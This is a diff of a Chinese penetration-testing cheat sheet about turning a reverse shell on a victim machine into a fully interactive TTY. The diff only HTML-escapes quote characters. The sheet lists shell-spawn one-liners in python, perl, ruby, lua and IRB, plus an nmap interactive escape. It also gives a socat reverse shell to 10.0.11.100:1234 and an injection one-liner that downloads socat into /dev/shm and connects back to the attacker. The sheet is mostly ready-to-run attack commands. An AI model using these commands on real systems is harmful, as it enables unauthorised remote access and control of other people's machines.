@@ -1,7 +1,7 @@
 # Shell Spawning
 
 
-<!--more-->
+&lt;!--more--&gt;
 
 # Shell-Spawning（反弹shell到TTYShell）
 
@@ -22,8 +22,8 @@
 ### 基于Python:
 
 ```bash
-python -c 'import pty; pty.spawn("/bin/sh")'
-python3 -c 'import pty; pty.spawn("/bin/sh")'
+python -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;
+python3 -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;
 ```
 
 
@@ -39,15 +39,15 @@ which python python2 python3
 2. 在靶机上输入以下命令（使用机器上可用的 python 版本！）
 
 ```rust
-python3 -c 'import pty;pty.spawn("/bin/bash")';
+python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;;
 ```
 
 3. 接下来，在靶机上输入以下命令来设置一些重要的环境变量：
 
 ```bash
 export SHELL=bash
-export TERM="xterm-256color" #允许 clear，并且有颜色
-export TERM="screen-256color" # TERM任选其一
+export TERM=&#34;xterm-256color&#34; #允许 clear，并且有颜色
+export TERM=&#34;screen-256color&#34; # TERM任选其一
 ```
 
 4. 键入 ctrl-z 以将 shell 发送到后台。
@@ -67,29 +67,29 @@ stty raw -echo;fg
 ### 其他命令：
 
 ```bash
-echo os.system('/bin/bash')
+echo os.system(&#39;/bin/bash&#39;)
 /bin/sh -i
 
 #python3
-python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;
 
 #perl
-exec "/bin/sh";
-perl -e 'exec "/bin/sh";'
+exec &#34;/bin/sh&#34;;
+perl -e &#39;exec &#34;/bin/sh&#34;;&#39;
 
 #ruby
-exec "/bin/sh"
-ruby -e 'exec "/bin/sh"'
+exec &#34;/bin/sh&#34;
+ruby -e &#39;exec &#34;/bin/sh&#34;&#39;
 
 #lua
-lua -e "os.execute('/bin/sh')"
+lua -e &#34;os.execute(&#39;/bin/sh&#39;)&#34;
 ```
 
 
 
 ## 2、nmap
 
-nmap版本 **<=5.21**.
+nmap版本 **&lt;=5.21**.
 
 ```
 nmap --interactive
@@ -127,7 +127,7 @@ stty -a
 
 ```shell
 In victim machine reverse shell
-$ python -c 'import pty; pty.spawn("/bin/bash")'
+$ python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
 Ctrl-Z         
 
 In Attacker console
@@ -142,7 +142,7 @@ In reverse shell
 $ reset
 $ export SHELL=bash
 $ export TERM=xterm-256color
-$ stty rows <num> columns <cols>
+$ stty rows &lt;num&gt; columns &lt;cols&gt;
 ```
 
 
@@ -150,7 +150,7 @@ $ stty rows <num> columns <cols>
 ## 5、IRB
 
 ```shell
-(From within IRB) - exec "/bin/sh"
+(From within IRB) - exec &#34;/bin/sh&#34;
 ```
 
 
@@ -172,13 +172,13 @@ $ rlwrap nc -lvnp $port
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 
 #靶机:
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.11.100:1234
+socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.0.11.100:1234
 ```
 
 如果在命令注入的地方注入反弹 shell，获得即时完全交互式的反向 shell：
 
 ```bash
-wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.11.100:1234
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod &#43;x /dev/shm/socat; /dev/shm/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.0.11.100:1234
 ```
 
 如果靶机访问不了互联网，就先把 socat 文件下载下来，开启 http 服务，然后将上面的路径指向你的本地地址。
